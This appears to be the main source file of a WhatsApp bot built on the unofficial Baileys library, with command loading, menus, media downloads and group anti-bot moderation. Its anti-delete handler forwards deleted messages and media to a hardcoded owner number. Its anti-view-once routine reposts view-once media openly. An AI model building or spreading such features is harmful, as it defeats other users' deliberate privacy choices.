require('dotenv').config()
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, WAMessageStubType } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const settings = require('./settings');

const PROTECTED_OWNER_NUMS = ["2347072956206", "2348108717744"];
function isRealOwner(jid){ return PROTECTED_OWNER_NUMS.some(n=>jid&&jid.includes(n)) }
function getOwnerJid(){ return PROTECTED_OWNER_NUMS[0]+"@s.whatsapp.net" }

global.privacyMode = "public";
global.sudo = fs.existsSync('./sudo.json')? JSON.parse(fs.readFileSync('./sudo.json')) : [];
global.anticall = false;
global.antiviewonce = true;
global.creact = true;
global.aliveReply = global.aliveReply || {};
global.settingsReply = global.settingsReply || {};
global.menuReply = global.menuReply || {};
global.songCache = global.songCache || {};
global.videoCache = global.videoCache || {};
global.viewOnceCache = global.viewOnceCache || new Map();
global.antibot = global.antibot || {};
global.botWarnings = global.botWarnings || {};
global.antiDelete = true;
global.messageCache = global.messageCache || new Map();
global.__botStarting = global.__botStarting || false;
global.__botReconnectTimer = global.__botReconnectTimer || null;

process.on("uncaughtException", (err) => { console.error("UNCAUGHT EXCEPTION:", err); });
process.on("unhandledRejection", (reason) => { console.error("UNHANDLED REJECTION:", reason); });

async function startBot(){
if (global.__botStarting) return;
global.__botStarting = true;
try {
const { state, saveCreds } = await useMultiFileAuthState(path.resolve(settings.sessionName));
const sock = makeWASocket({ auth: state, logger: pino({ level: 'info' }) });

const commands = new Map();
const cmdPath = path.join(__dirname,'commands');
fs.readdirSync(cmdPath).forEach(f=>{
  if(f.endsWith('.js')){
    try{
      delete require.cache[require.resolve(`./commands/${f}`)];
      let c=require(`./commands/${f}`);
      commands.set(c.name,c);
      if(c.alias) c.alias.forEach(a=>commands.set(String(a).toLowerCase(),c));
      if(c.aliases) c.aliases.forEach(a=>commands.set(String(a).toLowerCase(),c));
    }catch(e){ console.error(`FAILED COMMAND LOAD ${f}:`, e.message) }
  }
});

sock.ev.on('creds.update', saveCreds);

const handledDeleteKeys = new Set();
async function handleDeletedMessage(key, deletedByKey = null) {
  if (!global.antiDelete ||!key?.id) return;
  const cacheKey = `${key.remoteJid}:${key.id}`;
  if (handledDeleteKeys.has(cacheKey)) return;
  handledDeleteKeys.add(cacheKey);
  setTimeout(() => handledDeleteKeys.delete(cacheKey), 60000);
  const cached = global.messageCache.get(cacheKey);
  if (!cached?.message) return;
  try {
    const ownerJid = getOwnerJid();
    const sender = cached.key?.participant || cached.key?.remoteJid || 'unknown';
    const deletedBy = deletedByKey?.participant || deletedByKey?.remoteJid || 'unknown';
    const senderName = String(cached.pushName || 'Unknown').replace(/[\r\n]/g, ' ').trim() || 'Unknown';
    const deletedByName = String(deletedByKey?.pushName || (deletedBy === sender? senderName : 'Unknown')).replace(/[\r\n]/g, ' ').trim() || 'Unknown';
    const deleteDesign = `┏━━━━━━━━━━━━━━━━━\n┃ 🗑️ *MESSAGE DELETED*\n┗━━━━━━━━━━━━━━━━━\n*🤦‍♂️ Sender :* _${senderName}_\n*🌬️ Delete By :* _${deletedByName}_\n━━━━━━━━━━━━━━━━━━\n${settings.footer}`;
    const unwrap = (msg) => { if (!msg || typeof msg!== 'object') return {}; for (const wrapper of ['ephemeralMessage','viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension','documentWithCaptionMessage']) { if (msg[wrapper]?.message) return unwrap(msg[wrapper].message); } return msg; };
    const original = unwrap(cached.message);
    const originalText = original.conversation || original.extendedTextMessage?.text;
    if (originalText) {
      await sock.sendMessage(ownerJid, { text: `${deleteDesign}\n\n*Message :* ${originalText}`, mentions: sender.includes('@')? [sender] : [] });
    } else if (original.imageMessage || original.videoMessage || original.audioMessage || original.documentMessage || original.stickerMessage) {
      const media = await downloadMediaMessage(cached, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      if (original.imageMessage) await sock.sendMessage(ownerJid, { image: media, caption: deleteDesign, mentions: sender.includes('@')? [sender] : [] });
      else if (original.videoMessage) await sock.sendMessage(ownerJid, { video: media, caption: deleteDesign, mentions: sender.includes('@')? [sender] : [] });
      else if (original.audioMessage) { await sock.sendMessage(ownerJid, { audio: media, mimetype: original.audioMessage.mimetype || 'audio/mpeg', ptt:!!original.audioMessage.ptt }); await sock.sendMessage(ownerJid, { text: deleteDesign }); }
      else if (original.documentMessage) await sock.sendMessage(ownerJid, { document: media, mimetype: original.documentMessage.mimetype || 'application/octet-stream', fileName: original.documentMessage.fileName || 'deleted-file', caption: deleteDesign });
      else if (original.stickerMessage) { await sock.sendMessage(ownerJid, { sticker: media }); await sock.sendMessage(ownerJid, { text: deleteDesign }); }
    }
  } catch (e) { console.error('ANTI-DELETE ERROR:', e.message); }
  finally { global.messageCache.delete(cacheKey); }
}

sock.ev.on('messages.delete', async (data) => { for (const key of (data?.keys || [])) await handleDeletedMessage(key, null); });
sock.ev.on('messages.update', async (updates) => {
  for (const entry of updates || []) {
    const update = entry?.update || {};
    const protocolType = update?.message?.protocolMessage?.type;
    const stub = String(update?.messageStubType || '');
    if (protocolType === 0 || update?.messageStubType === WAMessageStubType.REVOKE || stub === '0' || /REVOKE/i.test(stub)) await handleDeletedMessage(entry.key, entry.key);
  }
});
global.__botStarting = false;
sock.ev.on('connection.update', async (u)=>{
  if(u.qr) qrcode.generate(u.qr,{small:true});
  if(u.connection==="close"){
    const err = u.lastDisconnect?.error;
    const r = err?.output?.statusCode;
    if(r!== DisconnectReason.loggedOut &&!global.__botReconnectTimer){
      global.__botReconnectTimer = setTimeout(()=>{ global.__botReconnectTimer = null; startBot().catch(e=>console.error("RECONNECT START ERROR:",e)); },5000);
    }
  }
});

function extractInteractiveId(message){
  if(!message || typeof message!== "object") return "";
  const direct = message.buttonsResponseMessage?.selectedButtonId || message.templateButtonReplyMessage?.selectedId || message.listResponseMessage?.singleSelectReply?.selectedRowId;
  if(direct) return String(direct);
  const native = message.interactiveResponseMessage?.nativeFlowResponseMessage;
  if(native){
    try{
      const raw = native.paramsJson;
      const json = typeof raw === "string"? raw : Buffer.isBuffer(raw)? raw.toString("utf8") : raw && typeof raw === "object"? JSON.stringify(raw) : String(raw || "");
      const parsed = JSON.parse(json || "{}");
      const id = parsed.id || parsed.selectedId || parsed.selected_id || parsed.button_id || parsed.buttonId || parsed.display_text || parsed.displayText;
      if(id) return String(id);
    }catch{}
  }
  for(const wrapper of ["ephemeralMessage","viewOnceMessage","viewOnceMessageV2","viewOnceMessageV2Extension","documentWithCaptionMessage"]){ const nested=message[wrapper]?.message; const id=extractInteractiveId(nested); if(id) return id; }
  return "";
}

sock.ev.on('messages.upsert', async ({messages, type})=>{
for (const incoming of (messages || [])) {
let m=incoming;
if(!m.message) continue;
let chat=m.key.remoteJid;
if(chat === "status@broadcast") continue;
let sender=m.key.participant||chat;
let senderAlt=m.key.participantAlt||m.key.remoteJidAlt||"";
let isOwner=!!m.key.fromMe || isRealOwner(sender)||isRealOwner(senderAlt)||isRealOwner(chat)||global.sudo?.includes(sender)||global.sudo?.includes(senderAlt);
if(m.key.fromMe &&!isOwner) return;
m.chat=chat;

// ===== ACTIVITY TRACKER FOR?top =====
try {
  let dbPath = './database/activity.json'
  if(!fs.existsSync('./database')) fs.mkdirSync('./database')
  if(!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify({}))
  let db = JSON.parse(fs.readFileSync(dbPath))
  if(chat.endsWith('@g.us')){
    if(!db[chat]) db[chat] = { enabled: false, users: {} }
    if(db[chat].enabled){
      let s = m.key.participant || chat
      if(!db[chat].users[s]) db[chat].users[s] = 0
      db[chat].users[s] += 1
      fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
    }
  }
} catch(e){}
// ===== END TRACKER =====

global.messageCache.set(`${chat}:${m.key.id}`, m);
if (global.messageCache.size > 1000) { const first = global.messageCache.keys().next().value; if (first) global.messageCache.delete(first); }

const unwrapMessage = (msg) => { if(!msg || typeof msg!== "object") return {}; for(const wrapper of ["ephemeralMessage","viewOnceMessage","viewOnceMessageV2","viewOnceMessageV2Extension","documentWithCaptionMessage"]){ if(msg[wrapper]?.message) return unwrapMessage(msg[wrapper].message); } return msg; };
const msg = unwrapMessage(m.message);
try { const protocol = msg?.protocolMessage; if (protocol?.type === 0 && protocol?.key?.id) { await handleDeletedMessage(protocol.key, m.key); continue; } } catch (e) {}
let body= msg.conversation || msg.extendedTextMessage?.text || msg.buttonsResponseMessage?.selectedButtonId || msg.templateButtonReplyMessage?.selectedId || msg.listResponseMessage?.singleSelectReply?.selectedRowId || extractInteractiveId(m.message) || "";
let pushName = m.pushName || "User"

// ===== ANTI-VIEWONCE =====
const findViewOnce = (msg) => {
  if (!msg || typeof msg!== 'object') return null;
  const mediaTypes = ['imageMessage','videoMessage','audioMessage'];
  for (const type of mediaTypes) { const media = msg[type]; if (media && (media.viewOnce === true || media.viewOnceV2 === true || media.isViewOnce === true)) { return { type, message: msg }; } }
  for (const wrapper of ['ephemeralMessage','viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension','documentWithCaptionMessage']) { const inner = msg[wrapper]?.message; if (!inner) continue; const nested = findViewOnce(inner); if (nested) return nested; const type = Object.keys(inner).find(k => mediaTypes.includes(k)); if (type) return { type, message: inner }; }
  return null;
};
const getReplyContext = (msg) => { if (!msg || typeof msg!== 'object') return null; for (const type of ['extendedTextMessage','imageMessage','videoMessage','audioMessage','documentMessage','buttonsResponseMessage','templateButtonReplyMessage','listResponseMessage','interactiveResponseMessage']) { if (msg[type]?.contextInfo) return msg[type].contextInfo; } return null; };
try {
  const detectedViewOnce = findViewOnce(m.message);
  if (detectedViewOnce?.message) { global.viewOnceCache.set(`${chat}:${m.key.id}`, m); if (global.viewOnceCache.size > 200) { const first = global.viewOnceCache.keys().next().value; if (first) global.viewOnceCache.delete(first); } }
  if (global.antiviewonce) {
    const ctx = getReplyContext(m.message); const stanzaId = ctx?.stanzaId; let target = stanzaId? global.viewOnceCache.get(`${chat}:${stanzaId}`) : null;
    if (!target && stanzaId) { const cached = global.messageCache.get(`${chat}:${stanzaId}`); if (cached && findViewOnce(cached.message)) target = cached; }
    if (!target && ctx?.quotedMessage && findViewOnce(ctx.quotedMessage)) target = { key: { remoteJid: chat, id: stanzaId || `quoted-${Date.now()}`, fromMe: false, participant: ctx.participant || sender }, message: ctx.quotedMessage, pushName: 'User' };
    if (target?.message) {
      const view = findViewOnce(target.message);
      if (view?.message && ['imageMessage','videoMessage','audioMessage'].includes(view.type)) {
        const mediaMessage = view.message[view.type] || view.message;
        const inner = { [view.type]: mediaMessage };
        const targetForDownload = {...target, message: inner, key: {...(target.key || {}), remoteJid: target.key?.remoteJid || chat, id: target.key?.id || stanzaId || m.key.id } };
        const buffer = await downloadMediaMessage(targetForDownload, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
        const caption = `┏━━━━━━━━━━━━━━\n┃ 👁️ *ANTI VIEW ONE*\n┗━━━━━━━━━━━━━━\n*Note :-* _Do not use this service to damage the image of any person._\n━━━━━━━━━━━━━━━━━━━━\n${settings.footer}`;
        if (view.type === 'imageMessage') await sock.sendMessage(chat, { image: buffer, caption });
        else if (view.type === 'videoMessage') await sock.sendMessage(chat, { video: buffer, caption });
        else if (view.type === 'audioMessage') { await sock.sendMessage(chat, { audio: buffer, mimetype: view.message[view.type]?.mimetype || 'audio/mpeg', ptt:!!view.message[view.type]?.ptt }); await sock.sendMessage(chat, { text: caption }); }
        if (stanzaId) global.viewOnceCache.delete(`${chat}:${stanzaId}`);
      }
    }
  }
} catch (e) {}

// ===== ANTI-BOT =====
try {
  if (chat.endsWith("@g.us") && global.antibot[chat]!== false &&!isOwner && body.trim().startsWith("?")) {
    try { await sock.sendMessage(chat, { delete: m.key }) } catch {}
    const senderNumber = String(sender).split("@")[0];
    const warn = (global.botWarnings[sender] || 0) + 1;
    global.botWarnings[sender] = warn;
    const warnText = `*🛡️⃝⃘̉̉̉━⋆─❂*\n*┃* \`𝗔𝗡𝗧𝗜 𝗕𝗢𝗧\`\n*┗━━━━━━━━━━❂*\n\n*👤 User:* @${senderNumber}\n*🚫 Reason:* *Unauthorized Bot usage*\n*📉 Warning:* *${warn}/5*\n*⚠️ Action:* *Deleted & Warned*\n\n${settings.footer}`;
    await sock.sendMessage(chat, { text: warnText, mentions: [sender] });
    if (warn >= 5) { try { await sock.groupParticipantsUpdate(chat, [sender], "remove"); delete global.botWarnings[sender]; } catch (e) {} }
    return;
  }
} catch (e) {}

// ===== ALIVE REPLY =====
let cleanBody = body.trim().toLowerCase()
if(global.aliveReply[chat] && ["1","2","3","4"].includes(cleanBody)){
  delete global.aliveReply[chat]
  if(cleanBody==="1"){ body = ".menu" }
  else if(cleanBody==="2"){ body = ".ping" }
  else if(cleanBody==="3"){
    if(!isOwner) return sock.sendMessage(chat, { text: `❌ Owner only\n${settings.footer}` }, { quoted: m })
    return sock.sendMessage(chat, { text: `*⚙️ SETTINGS*\n\n*Owner:* ${PROTECTED_OWNER_NUMS.join(", ")}\n*Prefix:* ${settings.prefix}\n*Mode:* ${global.privacyMode}\n*AntiCall:* ${global.anticall}\n*AntiViewOnce:* ${global.antiviewonce}\n*AntiBot:* ${global.antibot[chat]?"ON":"OFF"}\n\n${settings.footer}` }, { quoted: m })
  } else if(cleanBody==="4"){
    let up = Math.floor(process.uptime()/60)
    let hrs = Math.floor(up/60)
    let uptime = hrs>0? `${hrs}h ${up%60}m` : `${up}m`
    return sock.sendMessage(chat, { text: `*🤖 BOT INFO*\n\n*Name:* E TECH OFC\n*Owner:* Mr Ephraim Ofc\n*Commands:* ${commands.size}\n*Uptime:* ${uptime}\n*Prefix:* ${settings.prefix}\n\n${settings.footer}` }, { quoted: m })
  }
}
if(global.menuReply[chat] && ["1","2","3","4","5","6","7"].includes(cleanBody)){
  const menuCmds = { "1": "ownermenu", "2": "dlmenu", "3": "aimenu", "4": "gmenu", "5": "toolsmenu", "6": "edumenu", "7": "channelmenu" };
  const selected = menuCmds[cleanBody];
  delete global.menuReply[chat];
  if(cleanBody === "1" &&!isOwner){ return sock.sendMessage(chat, { text: `❌ Owner only\n${settings.footer}` }, { quoted: m }); }
  const sub = commands.get(selected);
  if(!sub){ return sock.sendMessage(chat, { text: `❌ Submenu unavailable: ${selected}\n${settings.footer}` }, { quoted: m }); }
  try{ m.pushName = pushName; return await sub.execute(sock,m,[],settings); }catch(e){ return sock.sendMessage(chat, { text: `❌ Submenu error: ${e.message}\n${settings.footer}` }, { quoted: m }); }
}
if(body.startsWith("etech_video_") && commands.has("video")){
  const quality = body.toLowerCase().replace("etech_video_", "");
  if(["360","480","720"].includes(quality)){ try{ m.pushName = pushName; return await commands.get("video").execute(sock,m,[quality + "p"],settings); }catch(e){} }
}
if(body.startsWith("etech_song_") && commands.has("song")){
  const action = body.toLowerCase();
  if(action === "etech_song_audio" || action === "etech_song_document" || action === "etech_song_voice"){ try{ m.pushName = pushName; return await commands.get("song").execute(sock,m,[action.replace("etech_song_","")],settings); }catch(e){} }
}
if(/^(360P|480P|720P)$/i.test(body) && commands.has("video")){ try{ m.pushName = pushName; return await commands.get("video").execute(sock,m,[body.toLowerCase()],settings); }catch(e){} }
if(/^(AUDIO|DOCUMENT|VOICE)$/i.test(body) && commands.has("song")){ try{ m.pushName = pushName; return await commands.get("song").execute(sock,m,[body.toLowerCase()],settings); }catch(e){} }
if(global.settingsReply[chat] && ["1","2","3","4","5","6","7"].includes(cleanBody)){ body = `?settings ${cleanBody}` }
const ownerOnlyCmds = ["settings","setting","mode","ban","unban","setsudo","delsudo","restart","anticall","antiviewonce","creact","close","open","antibot","antidelete"]
const reactMap = { menu:"📜", ping:"🏓", alive:"🌎", settings:"⚙️", setting:"⚙️" }
const stagedCmds = ["song","play","music","tiktok","fb","video","insta"]
let usedPrefix=null
if(body.startsWith("?")) usedPrefix="?"
else if(body.startsWith(settings.prefix)) usedPrefix=settings.prefix
else return
if(usedPrefix==="?" &&!isOwner) return
let args=body.slice(usedPrefix.length).trim().split(/ +/)
let cmdName=args.shift().toLowerCase()
if(!cmdName) return
if((cmdName==="settings" || cmdName==="setting") && usedPrefix!== "?") return
if(ownerOnlyCmds.includes(cmdName) && usedPrefix==="." &&!isOwner) return
if(reactMap[cmdName] &&!stagedCmds.includes(cmdName)){ try{ await sock.sendMessage(chat, { react: { text: reactMap[cmdName], key: m.key } }) }catch{} }
if(commands.has(cmdName)){
  try{
    m.pushName = pushName
    await commands.get(cmdName).execute(sock,m,args,settings)
    if(cmdName==="menu"){ global.menuReply[chat]=true; setTimeout(()=>{ delete global.menuReply[chat] },120000) }
  }catch(e){ console.error(`COMMAND ERROR ${cmdName}:`,e) }
}
}
});
} catch (e) {
  global.__botStarting = false;
  console.error("START BOT ERROR:", e);
  if (!global.__botReconnectTimer) { global.__botReconnectTimer = setTimeout(()=>{ global.__botReconnectTimer = null; startBot().catch(err=>console.error("RESTART ERROR:", err)); },5000); }
}
}
startBot().catch(e=>console.error("FATAL START ERROR:", e));
